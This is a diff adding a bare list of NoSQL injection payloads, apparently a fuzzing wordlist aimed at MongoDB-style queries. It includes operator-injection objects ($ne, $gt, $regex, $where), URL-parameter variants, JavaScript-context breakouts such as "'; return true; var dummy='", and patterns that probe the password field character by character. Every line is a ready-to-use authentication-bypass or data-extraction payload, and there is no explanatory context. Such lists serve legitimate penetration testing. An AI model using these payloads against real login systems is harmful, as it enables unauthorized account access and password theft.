@@ -1,0 +1,27 @@
+{'$ne': null}
+{'$ne': 1}
+{'$gt': ''}
+{'$gt': 0}
+{'$lt': 999999}
+{'$regex': '.*'}
+{'$regex': '^'}
+{'$where': 'this.password.length > 0'}
+{'$where': '1==1'}
+[$ne]=1
+[$gt]=
+[$regex]=.*
+admin'||'1'=='1
+'; return true; var dummy='
+'; return 1; var dummy='
+'; return db.users.find(); var dummy='
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{$or: [{"username": "admin"}, {"password": {"$ne": ""}}]}
+'||1==1//
+'||1==1/*
+'||1==1;--
+{"$or":[{},{"a":"a"}]}
+{"_id": {"$ne": "invalid"}}
+'&&this.password.match(/.*/)//
+'&&this.passwordzz.match(/.*/)//'+
+'%26%26this.password.match(/.*/)//'+
